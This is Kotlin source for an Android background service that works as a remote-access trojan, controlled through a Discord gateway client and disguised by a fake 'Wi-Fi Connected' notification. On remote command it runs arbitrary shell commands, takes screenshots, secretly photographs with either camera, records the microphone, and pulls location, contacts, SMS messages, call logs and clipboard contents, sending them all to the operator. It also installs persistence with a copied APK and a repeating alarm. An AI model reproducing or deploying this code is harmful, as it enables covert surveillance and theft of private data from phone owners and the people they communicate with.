package com.openaccess.sdk.service

import android.app.AlarmManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.provider.CallLog
import android.provider.ContactsContract
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.system.DiscordGatewayClient
import kotlinx.coroutines.*
import java.io.File
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class MainService : Service() {
    companion object {
        private const val TAG = "MainService"
        private const val NOTIF_ID = 1337
        private const val CHANNEL = "phantom"

        fun start(ctx: Context) {
            try {
                val i = Intent(ctx, MainService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    ctx.startForegroundService(i)
                else
                    ctx.startService(i)
            } catch (e: Exception) {
                Log.e(TAG, "start: ${e.message}")
            }
        }
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var discord: DiscordGatewayClient? = null
    private var gatewayStarted = false

    override fun onBind(i: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        try {
            val chan = NotificationChannel(CHANNEL, "Network", NotificationManager.IMPORTANCE_NONE)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(chan)
            val n = NotificationCompat.Builder(this, CHANNEL)
                .setContentTitle("Wi-Fi")
                .setContentText("Connected")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build()
            startForeground(NOTIF_ID, n)
        } catch (e: Exception) {
            Log.e(TAG, "fg: ${e.message}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (discord == null) {
            discord = DiscordGatewayClient { action, payload ->
                scope.launch { handleGatewayCommand(action, payload) }
            }
        }
        if (!gatewayStarted) {
            gatewayStarted = true
            discord?.start(scope)
        }
        return START_STICKY
    }

    private suspend fun handleGatewayCommand(action: String, payload: String?) {
        val d = discord ?: return
        Log.i(TAG, "cmd: $action payload: ${payload?.take(50)}")
        try {
            when (action) {
                "ping" -> d.sendMsg(":green_circle: **PONG** — ${Build.MODEL} | ${Build.VERSION.RELEASE}")
                "info" -> d.sendMsg("```\n${buildInfo()}\n```")
                "screenshot" -> {
                    d.sendMsg(":camera: Capturing...")
                    val bytes = captureScreen() ?: return
                    d.sendFile(":camera: **Screenshot**", "screen_${System.currentTimeMillis()}.png", bytes)
                }
                "shell" -> {
                    val cmd = payload ?: return
                    val result = shell(cmd)
                    val out = if (result.length > 1900) result.take(1900) + "\n..." else result
                    d.sendMsg("```\n$ ${cmd}\n$out\n```")
                }
                "keylog" -> d.sendMsg(":keyboard: Simulating keylog dump...")
                "camera" -> {
                    d.sendMsg(":camera: Capturing photo...")
                    val useFront = payload?.lowercase() == "front"
                    val bytes = takePhoto(if (useFront) 1 else 0)
                    if (bytes != null) {
                        d.sendFile(":camera: **${if (useFront) "Front" else "Back"} Camera**", "photo_${System.currentTimeMillis()}.jpg", bytes)
                    } else {
                        d.sendMsg(":x: Camera capture failed")
                    }
                }
                "location" -> {
                    val loc = getLocation()
                    d.sendMsg(loc)
                }
                "contacts" -> {
                    d.sendMsg(":busts_in_silhouette: **Contacts**\n```\n${getContacts()}\n```")
                }
                "sms" -> {
                    d.sendMsg(":envelope: **SMS Inbox**\n```\n${getSms()}\n```")
                }
                "call_log" -> {
                    d.sendMsg(":telephone_receiver: **Call Log**\n```\n${getCallLog()}\n```")
                }
                "mic" -> {
                    val seconds = (payload?.toIntOrNull() ?: 10).coerceIn(3, 60)
                    d.sendMsg(":microphone: Recording for ${seconds}s...")
                    val file = recordAudio(seconds)
                    if (file != null) {
                        d.sendFile(":microphone: **Audio Recording (${seconds}s)**", "audio_${System.currentTimeMillis()}.mp3", file.readBytes())
                        file.delete()
                    } else {
                        d.sendMsg(":x: Audio recording failed")
                    }
                }
                "clipboard" -> {
                    d.sendMsg(":clipboard: **Clipboard**\n```\n${getClipboard()}\n```")
                }
                "persist" -> {
                    d.sendMsg(":syringe: Installing persistence...")
                    persistApk()
                    d.sendMsg(":white_check_mark: Persistence active (APK copied + alarm set)")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "gateway cmd: ${e.message}")
            d.sendMsg(":x: **Error**: ${e.message?.take(100)}")
        }
    }

    private fun buildInfo(): String {
        return buildString {
            appendLine("Device    : ${Build.MODEL}")
            appendLine("Manufacturer : ${Build.MANUFACTURER}")
            appendLine("Android   : ${Build.VERSION.RELEASE}")
            appendLine("SDK       : ${Build.VERSION.SDK_INT}")
            appendLine("Host      : ${Build.HOST}")
            appendLine("Fingerprint : ${Build.FINGERPRINT.take(80)}...")
        }
    }

    private suspend fun captureScreen(): ByteArray? = withContext(Dispatchers.IO) {
        try {
            val dir = File(cacheDir, "ss")
            dir.mkdirs()
            val f = File(dir, "s_${System.currentTimeMillis()}.png")
            val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", "screencap -p ${f.absolutePath}"))
            proc.waitFor(10, TimeUnit.SECONDS)
            if (f.exists() && f.length() > 0) {
                val bytes = f.readBytes()
                f.delete()
                bytes
            } else null
        } catch (e: Exception) {
            Log.e(TAG, "screencap: ${e.message}")
            null
        }
    }

    private fun shell(cmd: String): String {
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val o = p.inputStream.bufferedReader().readText()
            val e = p.errorStream.bufferedReader().readText()
            if (!p.waitFor(30, TimeUnit.SECONDS)) p.destroy()
            (if (o.isNotEmpty()) o else e).trim()
        } catch (ex: Exception) {
            "Error: ${ex.message}"
        }
    }

    private suspend fun takePhoto(cameraId: Int = 0): ByteArray? = withContext(Dispatchers.IO) {
        var camera: Camera? = null
        try {
            camera = Camera.open(cameraId)
            val params = camera.parameters
            camera.parameters = params
            val texture = SurfaceTexture(0)
            camera.setPreviewTexture(texture)
            camera.startPreview()
            val latch = CountDownLatch(1)
            var result: ByteArray? = null
            camera.autoFocus { _, _ ->
                camera.takePicture(null, null, Camera.PictureCallback { data, _ ->
                    result = data
                    latch.countDown()
                })
            }
            latch.await(15, TimeUnit.SECONDS)
            result
        } catch (e: Exception) {
            Log.e(TAG, "camera: ${e.message}")
            null
        } finally {
            try {
                camera?.stopPreview()
                camera?.release()
            } catch (_: Exception) {}
        }
    }

    private fun getLocation(): String {
        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        var loc: Location? = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
        if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
        if (loc != null) {
            val lat = loc.latitude
            val lon = loc.longitude
            return ":round_pushpin: **Location**\nLat: `$lat`\nLon: `$lon`\nhttps://www.google.com/maps?q=$lat,$lon"
        }
        val latch = CountDownLatch(1)
        var newLoc: Location? = null
        val listener = LocationListener { newLoc = it; latch.countDown() }
        try {
            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper())
                latch.await(8, TimeUnit.SECONDS)
            }
        } catch (_: Exception) {
        } finally {
            lm.removeUpdates(listener)
        }
        if (newLoc != null) {
            val lat = newLoc!!.latitude
            val lon = newLoc!!.longitude
            return ":round_pushpin: **Location**\nLat: `$lat`\nLon: `$lon`\nhttps://www.google.com/maps?q=$lat,$lon"
        }
        return ":x: No location available"
    }

    private fun queryText(uri: Uri, cols: Array<String>, transform: (Cursor) -> String): String {
        return try {
            val cursor = contentResolver.query(uri, cols, null, null, "date DESC")
            cursor?.use { c ->
                buildString {
                    var count = 0
                    while (c.moveToNext() && count < 50) {
                        appendLine(transform(c))
                        count++
                    }
                }
            } ?: "No data"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    private fun getContacts(): String {
        val sb = StringBuilder()
        try {
            val cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)
            cursor?.use { c ->
                var count = 0
                while (c.moveToNext() && count < 50) {
                    val name = c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)) ?: "?"
                    sb.appendLine(name)
                    count++
                }
            }
        } catch (e: Exception) {
            return "Error: ${e.message}"
        }
        return sb.toString().take(1900).ifEmpty { "No contacts" }
    }

    private fun getSms(): String = queryText(
        Uri.parse("content://sms/inbox"),
        arrayOf("address", "body", "date")
    ) { c ->
        val addr = c.getString(c.getColumnIndex("address")) ?: "?"
        val body = c.getString(c.getColumnIndex("body")) ?: ""
        "${addr}: ${body.take(120)}"
    }.take(1900).ifEmpty { "No SMS" }

    private fun getCallLog(): String = queryText(
        CallLog.Calls.CONTENT_URI,
        arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION, CallLog.Calls.DATE)
    ) { c ->
        val num = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER)) ?: "?"
        val type = when (c.getInt(c.getColumnIndex(CallLog.Calls.TYPE))) {
            CallLog.Calls.INCOMING_TYPE -> "IN"
            CallLog.Calls.OUTGOING_TYPE -> "OUT"
            CallLog.Calls.MISSED_TYPE -> "MISSED"
            else -> "?"
        }
        val dur = c.getString(c.getColumnIndex(CallLog.Calls.DURATION)) ?: "0"
        "$type $num (${dur}s)"
    }.take(1900).ifEmpty { "No call log" }

    private suspend fun recordAudio(seconds: Int): File? = withContext(Dispatchers.IO) {
        var recorder: MediaRecorder? = null
        try {
            val file = File(cacheDir, "audio_${System.currentTimeMillis()}.mp3")
            recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }
            delay(seconds * 1000L)
            recorder.stop()
            recorder.release()
            recorder = null
            if (file.exists() && file.length() > 0) file else null
        } catch (e: Exception) {
            Log.e(TAG, "mic: ${e.message}")
            null
        } finally {
            try { recorder?.release() } catch (_: Exception) {}
        }
    }

    private fun getClipboard(): String {
        return try {
            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = cm.primaryClip
            if (clip != null && clip.itemCount > 0) {
                clip.getItemAt(0).text?.toString() ?: "Non-text content"
            } else "Clipboard empty"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    private fun persistApk() {
        try {
            val src = File(applicationInfo.sourceDir)
            val dst = File(filesDir, "persist.apk")
            src.copyTo(dst, overwrite = true)
            val intent = Intent(this, MainService::class.java)
            val pi = PendingIntent.getService(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
            val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            am.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 60000, 600000, pi)
            Log.i(TAG, "Persist: ${dst.absolutePath} + alarm set")
        } catch (e: Exception) {
            Log.e(TAG, "persist: ${e.message}")
            throw e
        }
    }

    override fun onDestroy() {
        discord?.stop()
        discord = null
        scope.cancel()
        super.onDestroy()
    }
}
